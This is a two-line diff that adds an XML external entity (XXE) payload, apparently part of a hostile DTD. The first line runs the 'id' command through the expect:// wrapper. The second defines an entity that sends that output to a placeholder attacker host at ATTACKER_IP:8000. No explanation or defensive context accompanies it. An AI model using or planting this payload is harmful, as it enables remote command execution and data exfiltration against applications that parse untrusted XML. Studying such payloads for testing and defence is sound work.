@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "expect://id">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:8000/?%data;'>">
